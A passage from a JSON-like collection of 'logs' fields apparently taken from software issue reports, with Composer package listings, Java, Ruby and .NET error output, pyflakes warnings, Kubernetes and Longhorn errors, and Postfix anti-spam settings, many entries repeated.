        "logs": "$ composer show --latest 'sonata-project/*'\r\nsonata-project/admin-bundle              3.80.0 3.88.0 The missing Symfony Admin Generator\r\nsonata-project/block-bundle              3.21.0 4.5.0  Symfony SonataBlockBundle\r\nsonata-project/cache                     2.0.1  2.1.0  Cache library\r\nsonata-project/cache-bundle              3.2.1  3.2.1  This bundle provides caching services\r\nsonata-project/classification-bundle     3.14.0 3.14.0 Symfony SonataClassificationBundle\r\nsonata-project/datagrid-bundle           3.2.0  3.2.0  Symfony SonataDatagridBundle\r\nsonata-project/doctrine-extensions       1.11.0 1.11.0 Doctrine2 behavioral extensions\r\nsonata-project/doctrine-orm-admin-bundle 3.26.0 3.27.0 Integrate Doctrine ORM into the SonataAdminBundle\r\nsonata-project/easy-extends-bundle       2.5.0  2.5.0  Symfony SonataEasyExtendsBundle\r\nsonata-project/exporter                  2.5.0  2.5.0  Lightweight Exporter library\r\nsonata-project/form-extensions           1.8.1  1.8.1  Symfony form extensions\r\nsonata-project/formatter-bundle          4.3.0  4.3.0  Symfony SonataFormatterBundle\r\nsonata-project/intl-bundle               2.10.0 2.10.0 Symfony SonataIntlBundle\r\nsonata-project/media-bundle              3.29.0 3.29.0 Symfony SonataMediaBundle\r\nsonata-project/seo-bundle                2.12.0 2.12.0 Symfony SonataSeoBundle\r\nsonata-project/twig-extensions           1.5.0  1.5.0  Sonata twig extensions\r\nsonata-project/user-bundle               4.10.1 4.10.1 Symfony SonataUserBundle"
    },
    {
        "logs": "$ composer show --latest 'symfony/*'\r\nsymfony/acl-bundle                 v2.0.0  v2.0.0  Symfony AclBundle\r\nsymfony/asset                      v4.4.18 v5.2.1  Symfony Asset Component\r\nsymfony/browser-kit                v4.4.18 v5.2.1  Symfony BrowserKit Component\r\nsymfony/cache                      v4.4.18 v5.2.1  Symfony Cache component with PSR-6, PSR-16, and tags\r\nsymfony/cache-contracts            v2.2.0  v2.2.0  Generic abstractions related to caching\r\nsymfony/config                     v4.4.18 v5.2.1  Symfony Config Component\r\nsymfony/console                    v4.4.18 v5.2.1  Symfony Console Component\r\nsymfony/css-selector               v4.4.18 v5.2.1  Symfony CssSelector Component\r\nsymfony/debug                      v4.4.18 v4.4.18 Symfony Debug Component\r\nsymfony/dependency-injection       v4.4.18 v5.2.1  Symfony DependencyInjection Component\r\nsymfony/deprecation-contracts      v2.2.0  v2.2.0  A generic function and convention to trigger deprecation notices\r\nsymfony/doctrine-bridge            v4.4.18 v5.2.1  Symfony Doctrine Bridge\r\nsymfony/dom-crawler                v4.4.18 v5.2.1  Symfony DomCrawler Component\r\nsymfony/dotenv                     v4.4.18 v5.2.1  Registers environment variables from a .env file\r\nsymfony/error-handler              v4.4.18 v5.2.1  Symfony ErrorHandler Component\r\nsymfony/event-dispatcher           v4.4.18 v5.2.1  Symfony EventDispatcher Component\r\nsymfony/event-dispatcher-contracts v1.1.9  v2.2.0  Generic abstractions related to dispatching event\r\nsymfony/expression-language        v4.4.18 v5.2.1  Symfony ExpressionLanguage Component\r\nsymfony/filesystem                 v4.4.18 v5.2.1  Symfony Filesystem Component\r\nsymfony/finder                     v4.4.18 v5.2.1  Symfony Finder Component\r\nsymfony/flex                       v1.11.0 v1.11.0 Composer plugin for Symfony\r\nsymfony/form                       v4.4.18 v5.2.1  Symfony Form Component\r\nsymfony/framework-bundle           v4.4.18 v5.2.1  Symfony FrameworkBundle\r\nsymfony/http-client                v4.4.18 v5.2.1  Symfony HttpClient component\r\nsymfony/http-client-contracts      v2.3.1  v2.3.1  Generic abstractions related to HTTP clients\r\nsymfony/http-foundation            v4.4.18 v5.2.1  Symfony HttpFoundation Component\r\nsymfony/http-kernel                v4.4.18 v5.2.1  Symfony HttpKernel Component\r\nsymfony/inflector                  v4.4.18 v5.2.1  Symfony Inflector Component\r\nsymfony/intl                       v4.4.18 v5.2.1  A PHP replacement layer for the C intl extension that includes additional data from the ICU library.\r\nsymfony/mailer                     v4.4.18 v5.2.1  Symfony Mailer Component\r\nsymfony/maker-bundle               v1.28.0 v1.28.0 Symfony Maker helps you create empty commands, controllers, form classes, tests and more so you can forget about writing boilerplate code.\r\nsymfony/messenger                  v4.4.18 v5.2.1  Symfony Messenger Component\r\nsymfony/mime                       v4.4.18 v5.2.1  A library to manipulate MIME messages\r\nsymfony/monolog-bridge             v4.4.18 v5.2.1  Symfony Monolog Bridge\r\nsymfony/monolog-bundle             v3.6.0  v3.6.0  Symfony MonologBundle\r\nsymfony/options-resolver           v4.4.18 v5.2.1  Symfony OptionsResolver Component\r\nsymfony/orm-pack                   v1.0.8  v2.1.0  A pack for the Doctrine ORM\r\nsymfony/phpunit-bridge             v5.2.1  v5.2.1  Symfony PHPUnit Bridge\r\nsymfony/polyfill-intl-grapheme     v1.22.0 v1.22.0 Symfony polyfill for intl's grapheme_* functions\r\nsymfony/polyfill-intl-icu          v1.22.0 v1.22.0 Symfony polyfill for intl's ICU-related data and classes\r\nsymfony/polyfill-intl-idn          v1.22.0 v1.22.0 Symfony polyfill for intl's idn_to_ascii and idn_to_utf8 functions\r\nsymfony/polyfill-intl-normalizer   v1.22.0 v1.22.0 Symfony polyfill for intl's Normalizer class and related functions\r\n[Truncated]\n\r\nThe admin shows 'no' while the related object holds a 'true' value\r\n\r\n## Additional information\r\n\r\nWhen dumping the variables I can see "
    },
    {
        "logs": "$ composer show --latest 'sonata-project/*'\r\nsonata-project/admin-bundle              3.80.0 3.88.0 The missing Symfony Admin Generator\r\nsonata-project/block-bundle              3.21.0 4.5.0  Symfony SonataBlockBundle\r\nsonata-project/cache                     2.0.1  2.1.0  Cache library\r\nsonata-project/cache-bundle              3.2.1  3.2.1  This bundle provides caching services\r\nsonata-project/classification-bundle     3.14.0 3.14.0 Symfony SonataClassificationBundle\r\nsonata-project/datagrid-bundle           3.2.0  3.2.0  Symfony SonataDatagridBundle\r\nsonata-project/doctrine-extensions       1.11.0 1.11.0 Doctrine2 behavioral extensions\r\nsonata-project/doctrine-orm-admin-bundle 3.26.0 3.27.0 Integrate Doctrine ORM into the SonataAdminBundle\r\nsonata-project/easy-extends-bundle       2.5.0  2.5.0  Symfony SonataEasyExtendsBundle\r\nsonata-project/exporter                  2.5.0  2.5.0  Lightweight Exporter library\r\nsonata-project/form-extensions           1.8.1  1.8.1  Symfony form extensions\r\nsonata-project/formatter-bundle          4.3.0  4.3.0  Symfony SonataFormatterBundle\r\nsonata-project/intl-bundle               2.10.0 2.10.0 Symfony SonataIntlBundle\r\nsonata-project/media-bundle              3.29.0 3.29.0 Symfony SonataMediaBundle\r\nsonata-project/seo-bundle                2.12.0 2.12.0 Symfony SonataSeoBundle\r\nsonata-project/twig-extensions           1.5.0  1.5.0  Sonata twig extensions\r\nsonata-project/user-bundle               4.10.1 4.10.1 Symfony SonataUserBundle"
    },
    {
        "logs": "$ composer show --latest 'symfony/*'\r\nsymfony/acl-bundle                 v2.0.0  v2.0.0  Symfony AclBundle\r\nsymfony/asset                      v4.4.18 v5.2.1  Symfony Asset Component\r\nsymfony/browser-kit                v4.4.18 v5.2.1  Symfony BrowserKit Component\r\nsymfony/cache                      v4.4.18 v5.2.1  Symfony Cache component with PSR-6, PSR-16, and tags\r\nsymfony/cache-contracts            v2.2.0  v2.2.0  Generic abstractions related to caching\r\nsymfony/config                     v4.4.18 v5.2.1  Symfony Config Component\r\nsymfony/console                    v4.4.18 v5.2.1  Symfony Console Component\r\nsymfony/css-selector               v4.4.18 v5.2.1  Symfony CssSelector Component\r\nsymfony/debug                      v4.4.18 v4.4.18 Symfony Debug Component\r\nsymfony/dependency-injection       v4.4.18 v5.2.1  Symfony DependencyInjection Component\r\nsymfony/deprecation-contracts      v2.2.0  v2.2.0  A generic function and convention to trigger deprecation notices\r\nsymfony/doctrine-bridge            v4.4.18 v5.2.1  Symfony Doctrine Bridge\r\nsymfony/dom-crawler                v4.4.18 v5.2.1  Symfony DomCrawler Component\r\nsymfony/dotenv                     v4.4.18 v5.2.1  Registers environment variables from a .env file\r\nsymfony/error-handler              v4.4.18 v5.2.1  Symfony ErrorHandler Component\r\nsymfony/event-dispatcher           v4.4.18 v5.2.1  Symfony EventDispatcher Component\r\nsymfony/event-dispatcher-contracts v1.1.9  v2.2.0  Generic abstractions related to dispatching event\r\nsymfony/expression-language        v4.4.18 v5.2.1  Symfony ExpressionLanguage Component\r\nsymfony/filesystem                 v4.4.18 v5.2.1  Symfony Filesystem Component\r\nsymfony/finder                     v4.4.18 v5.2.1  Symfony Finder Component\r\nsymfony/flex                       v1.11.0 v1.11.0 Composer plugin for Symfony\r\nsymfony/form                       v4.4.18 v5.2.1  Symfony Form Component\r\nsymfony/framework-bundle           v4.4.18 v5.2.1  Symfony FrameworkBundle\r\nsymfony/http-client                v4.4.18 v5.2.1  Symfony HttpClient component\r\nsymfony/http-client-contracts      v2.3.1  v2.3.1  Generic abstractions related to HTTP clients\r\nsymfony/http-foundation            v4.4.18 v5.2.1  Symfony HttpFoundation Component\r\nsymfony/http-kernel                v4.4.18 v5.2.1  Symfony HttpKernel Component\r\nsymfony/inflector                  v4.4.18 v5.2.1  Symfony Inflector Component\r\nsymfony/intl                       v4.4.18 v5.2.1  A PHP replacement layer for the C intl extension that includes additional data from the ICU library.\r\nsymfony/mailer                     v4.4.18 v5.2.1  Symfony Mailer Component\r\nsymfony/maker-bundle               v1.28.0 v1.28.0 Symfony Maker helps you create empty commands, controllers, form classes, tests and more so you can forget about writing boilerplate code.\r\nsymfony/messenger                  v4.4.18 v5.2.1  Symfony Messenger Component\r\nsymfony/mime                       v4.4.18 v5.2.1  A library to manipulate MIME messages\r\nsymfony/monolog-bridge             v4.4.18 v5.2.1  Symfony Monolog Bridge\r\nsymfony/monolog-bundle             v3.6.0  v3.6.0  Symfony MonologBundle\r\nsymfony/options-resolver           v4.4.18 v5.2.1  Symfony OptionsResolver Component\r\nsymfony/orm-pack                   v1.0.8  v2.1.0  A pack for the Doctrine ORM\r\nsymfony/phpunit-bridge             v5.2.1  v5.2.1  Symfony PHPUnit Bridge\r\nsymfony/polyfill-intl-grapheme     v1.22.0 v1.22.0 Symfony polyfill for intl's grapheme_* functions\r\nsymfony/polyfill-intl-icu          v1.22.0 v1.22.0 Symfony polyfill for intl's ICU-related data and classes\r\nsymfony/polyfill-intl-idn          v1.22.0 v1.22.0 Symfony polyfill for intl's idn_to_ascii and idn_to_utf8 functions\r\nsymfony/polyfill-intl-normalizer   v1.22.0 v1.22.0 Symfony polyfill for intl's Normalizer class and related functions\r\n[Truncated]\n\r\nThe admin shows 'no' while the related object holds a 'true' value\r\n\r\n## Additional information\r\n\r\nWhen dumping the variables I can see `value` is set to `null` while the track object has a `isRemix` property value set to `true`"
    },
    {
        "logs": "@Mapper\r\npublic interface BrokenOrderMapper {\r\n\r\n    BrokenOrderMapper INSTANCE = Mappers.getMapper( BrokenOrderMapper.class );\r\n\r\n    @ValueMappings({\r\n            @ValueMapping(source = \"MONDAY\", target = \"MONDAY\")\r\n    })\r\n    JudeTarget orderTypeToExternalOrderTypeWithThrownException(JudeSrc orderType);\r\n}"
    },
    {
        "logs": "NoMethodError: undefined method `next_sync_url' for #<Array:0x007facad5719d8>\r\n/opt/rubies/2.2.4/lib/ruby/gems/2.2.0/bundler/gems/contentful.rb-82950e733e3e/lib/contentful/sync.rb:82:in `update_sync_state_from!'\r\n/opt/rubies/2.2.4/lib/ruby/gems/2.2.0/bundler/gems/contentful.rb-82950e733e3e/lib/contentful/sync.rb:65:in `get'\r\n/opt/rubies/2.2.4/lib/ruby/gems/2.2.0/bundler/gems/contentful.rb-82950e733e3e/lib/contentful/sync.rb:37:in `first_page'\r\n/opt/rubies/2.2.4/lib/ruby/gems/2.2.0/bundler/gems/contentful.rb-82950e733e3e/lib/contentful/sync.rb:24:in `each_page'\r\n/opt/rubies/2.2.4/lib/ruby/gems/2.2.0/bundler/gems/contentful.rb-82950e733e3e/lib/contentful/sync.rb:53:in `each_item'"
    },
    {
        "logs": "ruby\r\n\r\nrequired(:foo).maybe(:none?)\r\n\r\nresult = form.call('foo' => '23')\r\n\r\n__END__\r\n\r\nExpected:\r\n  false\r\n  [\"cannot be defined\"]\r\n\r\nActual:\r\n  false\r\n  [\"is missing\"]"
    },
    {
        "logs": "ruby\r\n\r\nrequired(:foo).maybe(:none?)\r\n\r\nresult = form.call('foo' => '23')\r\n\r\n__END__\r\n\r\nExpected:\r\n  false\r\n  [\"cannot be defined\"]\r\n\r\nActual:\r\n  false\r\n  [\"is missing\"]"
    },
    {
        "logs": "DueCredit Report:\r\n- Access a cacophony of neuro-imaging file formats / nibabel (v 2.0.2) [1]\r\n- Nipype: a flexible, lightweight and extensible neuroimaging data processing framework in Python / nipype (v UNKNOWN) [2, 3]\r\n- Scientific tools library / numpy (v 1.11) [4]\r\n- Scientific tools library / scipy (v 0.17) [5]\r\n\r\n4 packages cited\r\n0 modules cited\r\n0 functions cited\r\n\r\nReferences\r\n----------\r\n\r\n[1] Url('http://nipy.org/nibabel', key='http://nipy.org/nibabel')\r\n[2] 2016-05-04 10:21:56,128 [ERROR  ] Failed to process BibTeX file /tmp/alexandre/tmpz9hwm8k4.bib: 'data' (io.py:269)\r\n160504-10:21:56,128 duecredit ERROR  :\r\n\t Failed to process BibTeX file /tmp/alexandre/tmpz9hwm8k4.bib: 'data'\r\nERRORED: 'data'\r\n[3] Gorgolewski, K. et al., 2011. Nipype: A Flexible, Lightweight and Extensible Neuroimaging Data Processing Framework in Python. Frontiers in Neuroinformatics, 5.\r\n[4] Van Der Walt, S., Colbert, S.C. & Varoquaux, G., 2011. The NumPy array: a structure for efficient numerical computation. Computing in Science & Engineering, 13(2), pp.22\u201330.\r\n[5] Jones, E. et al., 2001. SciPy: Open source scientific tools for Python."
    },
    {
        "logs": "DueCredit Report:\r\n- Access a cacophony of neuro-imaging file formats / nibabel (v 2.0.2) [1]\r\n- Nipype: a flexible, lightweight and extensible neuroimaging data processing framework in Python / nipype (v UNKNOWN) [2, 3]\r\n- Scientific tools library / numpy (v 1.11) [4]\r\n- Scientific tools library / scipy (v 0.17) [5]\r\n\r\n4 packages cited\r\n0 modules cited\r\n0 functions cited\r\n\r\nReferences\r\n----------\r\n\r\n[1] Url('http://nipy.org/nibabel', key='http://nipy.org/nibabel')\r\n[2] 2016-05-04 10:21:56,128 [ERROR  ] Failed to process BibTeX file /tmp/alexandre/tmpz9hwm8k4.bib: 'data' (io.py:269)\r\n160504-10:21:56,128 duecredit ERROR  :\r\n\t Failed to process BibTeX file /tmp/alexandre/tmpz9hwm8k4.bib: 'data'\r\nERRORED: 'data'\r\n[3] Gorgolewski, K. et al., 2011. Nipype: A Flexible, Lightweight and Extensible Neuroimaging Data Processing Framework in Python. Frontiers in Neuroinformatics, 5.\r\n[4] Van Der Walt, S., Colbert, S.C. & Varoquaux, G., 2011. The NumPy array: a structure for efficient numerical computation. Computing in Science & Engineering, 13(2), pp.22\u201330.\r\n[5] Jones, E. et al., 2001. SciPy: Open source scientific tools for Python."
    },
    {
        "logs": " console\r\n$ git describe\r\nv1.6.7-13-gb1ac118\r\n$ pyflakes test_local.py \r\ntest_local.py:15: 'plumbum._testtools.xfail_on_pypy' imported but unused\r\ntest_local.py:291: 'plumbum.cmd.non_exist1N9' imported but unused\r\ntest_local.py:403: 'plumbum.cmd.cat' imported but unused\r\ntest_local.py:403: 'plumbum.cmd.head' imported but unused\r\ntest_local.py:564: 'plumbum.cmd.cat' imported but unused\r\ntest_local.py:576: 'plumbum.cmd.cat' imported but unused\r\ntest_local.py:770: redefinition of unused 'test_contains' from line 343\r\ntest_local.py:796: redefinition of unused 'test_redirection' from line 420\r\ntest_local.py:820: redefinition of unused 'test_popen' from line 444\r\ntest_local.py:829: redefinition of unused 'test_run' from line 453\r\ntest_local.py:835: redefinition of unused 'test_timeout' from line 459\r\ntest_local.py:840: redefinition of unused 'test_pipe_stderr' from line 464\r\ntest_local.py:851: redefinition of unused 'test_fair_error_attribution' from line 475\r\ntest_local.py:861: redefinition of unused 'test_iter_lines_timeout' from line 485\r\ntest_local.py:873: redefinition of unused 'test_iter_lines_error' from line 497\r\ntest_local.py:883: redefinition of unused 'test_modifiers' from line 507\r\ntest_local.py:898: redefinition of unused 'test_tee_modifier' from line 522\r\ntest_local.py:908: redefinition of unused 'test_arg_expansion' from line 532\r\ntest_local.py:914: redefinition of unused 'test_session' from line 538\r\ntest_local.py:926: redefinition of unused 'test_quoting' from line 550\r\ntest_local.py:939: redefinition of unused 'test_tempdir' from line 563\r\ntest_local.py:940: 'plumbum.cmd.cat' imported but unused\r\ntest_local.py:951: redefinition of unused 'test_direct_open_tmpdir' from line 575\r\ntest_local.py:952: 'plumbum.cmd.cat' imported but unused\r\ntest_local.py:964: redefinition of unused 'test_read_write_str' from line 588\r\ntest_local.py:970: redefinition of unused 'test_read_write_unicode' from line 594\r\ntest_local.py:976: redefinition of unused 'test_read_write_bin' from line 600\r\ntest_local.py:982: redefinition of unused 'test_links' from line 606\r\ntest_local.py:994: redefinition of unused 'test_list_processes' from line 618\r\ntest_local.py:997: redefinition of unused 'test_pgrep' from line 621\r\ntest_local.py:1000: redefinition of unused '_generate_sigint' from line 624\r\ntest_local.py:1009: redefinition of unused 'test_same_sesion' from line 633\r\ntest_local.py:1019: redefinition of unused 'test_new_session' from line 643\r\ntest_local.py:1029: redefinition of unused 'test_local_daemon' from line 653\r\ntest_local.py:1036: redefinition of unused 'test_atomic_file' from line 660\r\ntest_local.py:1046: redefinition of unused 'test_atomic_file2' from line 670\r\ntest_local.py:1065: redefinition of unused 'test_pid_file' from line 689\r\ntest_local.py:1081: redefinition of unused 'test_atomic_counter' from line 705\r\ntest_local.py:1111: redefinition of unused 'test_atomic_counter2' from line 735\r\ntest_local.py:1129: redefinition of unused 'test_bound_env' from line 753\r\ntest_local.py:1141: redefinition of unused 'test_nesting_lists_as_argv' from line 765\r\ntest_local.py:1146: redefinition of unused 'test_contains' from line 770\r\ntest_local.py:1149: redefinition of unused 'test_issue_139' from line 773\r\ntest_local.py:1152: redefinition of unused 'test_pipeline_failure' from line 776\r\ntest_local.py:1157: redefinition of unused 'test_pipeline_retcode' from line 781\r\ntest_local.py:1165: redefinition of unused 'test_pipeline_stdin' from line 789"
    },
    {
        "logs": " console\r\n$ git describe\r\nv1.6.7-13-gb1ac118\r\n$ pyflakes test_local.py \r\ntest_local.py:15: 'plumbum._testtools.xfail_on_pypy' imported but unused\r\ntest_local.py:291: 'plumbum.cmd.non_exist1N9' imported but unused\r\ntest_local.py:403: 'plumbum.cmd.cat' imported but unused\r\ntest_local.py:403: 'plumbum.cmd.head' imported but unused\r\ntest_local.py:564: 'plumbum.cmd.cat' imported but unused\r\ntest_local.py:576: 'plumbum.cmd.cat' imported but unused\r\ntest_local.py:770: redefinition of unused 'test_contains' from line 343\r\ntest_local.py:796: redefinition of unused 'test_redirection' from line 420\r\ntest_local.py:820: redefinition of unused 'test_popen' from line 444\r\ntest_local.py:829: redefinition of unused 'test_run' from line 453\r\ntest_local.py:835: redefinition of unused 'test_timeout' from line 459\r\ntest_local.py:840: redefinition of unused 'test_pipe_stderr' from line 464\r\ntest_local.py:851: redefinition of unused 'test_fair_error_attribution' from line 475\r\ntest_local.py:861: redefinition of unused 'test_iter_lines_timeout' from line 485\r\ntest_local.py:873: redefinition of unused 'test_iter_lines_error' from line 497\r\ntest_local.py:883: redefinition of unused 'test_modifiers' from line 507\r\ntest_local.py:898: redefinition of unused 'test_tee_modifier' from line 522\r\ntest_local.py:908: redefinition of unused 'test_arg_expansion' from line 532\r\ntest_local.py:914: redefinition of unused 'test_session' from line 538\r\ntest_local.py:926: redefinition of unused 'test_quoting' from line 550\r\ntest_local.py:939: redefinition of unused 'test_tempdir' from line 563\r\ntest_local.py:940: 'plumbum.cmd.cat' imported but unused\r\ntest_local.py:951: redefinition of unused 'test_direct_open_tmpdir' from line 575\r\ntest_local.py:952: 'plumbum.cmd.cat' imported but unused\r\ntest_local.py:964: redefinition of unused 'test_read_write_str' from line 588\r\ntest_local.py:970: redefinition of unused 'test_read_write_unicode' from line 594\r\ntest_local.py:976: redefinition of unused 'test_read_write_bin' from line 600\r\ntest_local.py:982: redefinition of unused 'test_links' from line 606\r\ntest_local.py:994: redefinition of unused 'test_list_processes' from line 618\r\ntest_local.py:997: redefinition of unused 'test_pgrep' from line 621\r\ntest_local.py:1000: redefinition of unused '_generate_sigint' from line 624\r\ntest_local.py:1009: redefinition of unused 'test_same_sesion' from line 633\r\ntest_local.py:1019: redefinition of unused 'test_new_session' from line 643\r\ntest_local.py:1029: redefinition of unused 'test_local_daemon' from line 653\r\ntest_local.py:1036: redefinition of unused 'test_atomic_file' from line 660\r\ntest_local.py:1046: redefinition of unused 'test_atomic_file2' from line 670\r\ntest_local.py:1065: redefinition of unused 'test_pid_file' from line 689\r\ntest_local.py:1081: redefinition of unused 'test_atomic_counter' from line 705\r\ntest_local.py:1111: redefinition of unused 'test_atomic_counter2' from line 735\r\ntest_local.py:1129: redefinition of unused 'test_bound_env' from line 753\r\ntest_local.py:1141: redefinition of unused 'test_nesting_lists_as_argv' from line 765\r\ntest_local.py:1146: redefinition of unused 'test_contains' from line 770\r\ntest_local.py:1149: redefinition of unused 'test_issue_139' from line 773\r\ntest_local.py:1152: redefinition of unused 'test_pipeline_failure' from line 776\r\ntest_local.py:1157: redefinition of unused 'test_pipeline_retcode' from line 781\r\ntest_local.py:1165: redefinition of unused 'test_pipeline_stdin' from line 789"
    },
    {
        "logs": "<Error>\r\n<Message>An error has occurred.</Message>\r\n<ExceptionMessage>\r\nConversion failed when converting the nvarchar value 'logo.png' to data type int.\r\n</ExceptionMessage>\r\n<ExceptionType>System.Data.SqlClient.SqlException</ExceptionType>\r\n<StackTrace>\r\nat System.Data.SqlClient.SqlConnection.OnError(SqlException exception, Boolean breakConnection, Action"
    },
    {
        "logs": "Ok, so there must be something wrong with the \"Dnn.PersonaBar.Sites.Services.SitesController.GetPortals(Int32 portalGroupId, String filter, Int32 pageIndex, Int32 pageSize)\" Method which lead me to the GetPortalsByName Procedure. The sql code looks fine but when I ran it gave me the error in this particular t-sql "
    },
    {
        "logs": "<Error>\r\n<Message>An error has occurred.</Message>\r\n<ExceptionMessage>\r\nConversion failed when converting the nvarchar value 'logo.png' to data type int.\r\n</ExceptionMessage>\r\n<ExceptionType>System.Data.SqlClient.SqlException</ExceptionType>\r\n<StackTrace>\r\nat System.Data.SqlClient.SqlConnection.OnError(SqlException exception, Boolean breakConnection, Action`1 wrapCloseInAction) at System.Data.SqlClient.TdsParser.ThrowExceptionAndWarning(TdsParserStateObject stateObj, Boolean callerHasConnectionLock, Boolean asyncClose) at System.Data.SqlClient.TdsParser.TryRun(RunBehavior runBehavior, SqlCommand cmdHandler, SqlDataReader dataStream, BulkCopySimpleResultSet bulkCopyHandler, TdsParserStateObject stateObj, Boolean& dataReady) at System.Data.SqlClient.SqlDataReader.TryHasMoreRows(Boolean& moreRows) at System.Data.SqlClient.SqlDataReader.TryReadInternal(Boolean setTimeout, Boolean& more) at System.Data.SqlClient.SqlDataReader.Read() at DotNetNuke.Common.Utilities.CBO.FillListFromReader(Type objType, IDataReader dr, IList objList, Boolean closeReader) at DotNetNuke.Common.Utilities.CBO.FillCollection(IDataReader dr, Type& objType, Int32& totalRecords) at DotNetNuke.Entities.Portals.PortalController.GetPortalsByName(String nameToMatch, Int32 pageIndex, Int32 pageSize, Int32& totalRecords) at Dnn.PersonaBar.Sites.Services.SitesController.GetPortals(Int32 portalGroupId, String filter, Int32 pageIndex, Int32 pageSize)\r\n</StackTrace>\r\n</Error>"
    },
    {
        "logs": "Plan apply failed: 1 error occurred:\r\n        * the Kubernetes API server reported that \"ingress-basic/nginx-ingress-controller\" failed to fully initialize or become live: Service \"nginx-ingress-controller\" is invalid: spec.clusterIP: Invalid value: \"\": field is immutable"
    },
    {
        "logs": "Plan apply failed: 1 error occurred:\r\n        * the Kubernetes API server reported that \"ingress-basic/nginx-ingress-controller\" failed to fully initialize or become live: Service \"nginx-ingress-controller\" is invalid: spec.clusterIP: Invalid value: \"\": field is immutable"
    },
    {
        "logs": "[instance-manager-r-8a4c54fc] [test1-r-da744d57] time=\"2019-09-27T22:34:24Z\" level=fatal msg=\"Error running start replica command: mkdir /host/var/lib/rancher/longhorn/replicas/test1-5e718a22: no such file or directory\"\r\n[instance-manager-r-8a4c54fc] [longhorn-instance-manager] time=\"2019-09-27T22:34:24Z\" level=info msg=\"Process Manager: process test1-r-da744d57 error out, error msg: exit status 1\"\r\n[instance-manager-r-8a4c54fc] [longhorn-instance-manager] time=\"2019-09-27T22:34:24Z\" level=info msg=\"Process Manager: prepare to create process test1-r-da744d57\""
    },
    {
        "logs": "[instance-manager-r-8a4c54fc] [test1-r-da744d57] time=\"2019-09-27T22:34:24Z\" level=fatal msg=\"Error running start replica command: mkdir /host/var/lib/rancher/longhorn/replicas/test1-5e718a22: no such file or directory\"\r\n[instance-manager-r-8a4c54fc] [longhorn-instance-manager] time=\"2019-09-27T22:34:24Z\" level=info msg=\"Process Manager: process test1-r-da744d57 error out, error msg: exit status 1\"\r\n[instance-manager-r-8a4c54fc] [longhorn-instance-manager] time=\"2019-09-27T22:34:24Z\" level=info msg=\"Process Manager: prepare to create process test1-r-da744d57\""
    },
    {
        "logs": "REPO FAIL: /.../repo my-repo with spaces\r\nUnable to clone repo my-repo with spaces. Exception: Cmd('git') failed due to: exit code(128)\r\n  cmdline: git clone -v git@bitbucket.org:team/my-repo with spaces.git /.../BACKUP_2019XXXX_UTC/my-repo with spaces\r\n  stderr: 'Cloning into '/.../my-repo with spaces'...\r\nRepository team/my-repo with spaces not found\r\nfatal: Could not read from remote repository.\r\n\r\nPlease make sure you have the correct access rights\r\nand the repository exists."
    },
    {
        "logs": "      355   Accepted                                    85.34%\r\n       61   Rejected                                    14.66%\r\n --------   --------------------------------------------------\r\n      416   Total                                      100.00%\r\n ========   ==================================================\r\n \r\n       61   5xx Reject RBL                             100.00%\r\n --------   --------------------------------------------------\r\n       61   Total 5xx Rejects                          100.00%\r\n ========   ==================================================\r\n \r\n        1   4xx Reject sender address                  100.00%\r\n --------   --------------------------------------------------\r\n        1   Total 4xx Rejects                          100.00%\r\n ========   =================================================="
    },
    {
        "logs": "# Settings to prevent SPAM early\r\nsmtpd_helo_required = yes\r\nsmtpd_delay_reject = yes\r\nsmtpd_helo_restrictions = permit_mynetworks, reject_invalid_helo_hostname, permit\r\nsmtpd_relay_restrictions = permit_mynetworks permit_sasl_authenticated defer_unauth_destination\r\nsmtpd_recipient_restrictions = permit_sasl_authenticated, permit_mynetworks, reject_unauth_destination, check_policy_service unix:private/policyd-spf, reject_unauth_pipelining, reject_invalid_helo_hostname, reject_non_fqdn_helo_hostname, reject_unknown_recipient_domain, check_policy_service inet:localhost:65265, reject_rbl_client zen.spamhaus.org\r\nsmtpd_client_restrictions = permit_mynetworks, permit_sasl_authenticated, reject_unauth_destination, reject_unauth_pipelining\r\nsmtpd_sender_restrictions = reject_authenticated_sender_login_mismatch, permit_sasl_authenticated, permit_mynetworks, reject_unknown_sender_domain\r\ndisable_vrfy_command = yes\r\n\r\n# Postscreen settings to drop zombies/open relays/spam early\r\npostscreen_dnsbl_action = enforce\r\npostscreen_dnsbl_sites =\r\n        bl.mailspike.net\r\n        b.barracudacentral.org*2\r\n        bl.spameatingmonkey.net\r\n        dnsbl.sorbs.net\r\n        psbl.surriel.com\r\n        list.dnswl.org=127.0.[0..255].0*-2\r\n        list.dnswl.org=127.0.[0..255].1*-3\r\n        list.dnswl.org=127.0.[0..255].[2..3]*-4\r\npostscreen_dnsbl_threshold = 3\r\npostscreen_dnsbl_whitelist_threshold = -1\r\npostscreen_greet_action = enforce\r\npostscreen_bare_newline_action = enforce"
    },
    {
        "logs": "      355   Accepted                                    85.34%\r\n       61   Rejected                                    14.66%\r\n --------   --------------------------------------------------\r\n      416   Total                                      100.00%\r\n ========   ==================================================\r\n \r\n       61   5xx Reject RBL                             100.00%\r\n --------   --------------------------------------------------\r\n       61   Total 5xx Rejects                          100.00%\r\n ========   ==================================================\r\n \r\n        1   4xx Reject sender address                  100.00%\r\n --------   --------------------------------------------------\r\n        1   Total 4xx Rejects                          100.00%\r\n ========   =================================================="
    },
    {
        "logs": "# Settings to prevent SPAM early\r\nsmtpd_helo_required = yes\r\nsmtpd_delay_reject = yes\r\nsmtpd_helo_restrictions = permit_mynetworks, reject_invalid_helo_hostname, permit\r\nsmtpd_relay_restrictions = permit_mynetworks permit_sasl_authenticated defer_unauth_destination\r\nsmtpd_recipient_restrictions = permit_sasl_authenticated, permit_mynetworks, reject_unauth_destination, check_policy_service unix:private/policyd-spf, reject_unauth_pipelining, reject_invalid_helo_hostname, reject_non_fqdn_helo_hostname, reject_unknown_recipient_domain, check_policy_service inet:localhost:65265, reject_rbl_client zen.spamhaus.org\r\nsmtpd_client_restrictions = permit_mynetworks, permit_sasl_authenticated, reject_unauth_destination, reject_unauth_pipelining\r\nsmtpd_sender_restrictions = reject_authenticated_sender_login_mismatch, permit_sasl_authenticated, permit_mynetworks, reject_unknown_sender_domain\r\ndisable_vrfy_command = yes\r\n\r\n# Postscreen settings to drop zombies/open relays/spam early\r\npostscreen_dnsbl_action = enforce\r\npostscreen_dnsbl_sites =\r\n        bl.mailspike.net\r\n        b.barracudacentral.org*2\r\n        bl.spameatingmonkey.net\r\n        dnsbl.sorbs.net\r\n        psbl.surriel.com\r\n        list.dnswl.org=127.0.[0..255].0*-2\r\n        list.dnswl.org=127.0.[0..255].1*-3\r\n        list.dnswl.org=127.0.[0..255].[2..3]*-4\r\npostscreen_dnsbl_threshold = 3\r\npostscreen_dnsbl_whitelist_threshold = 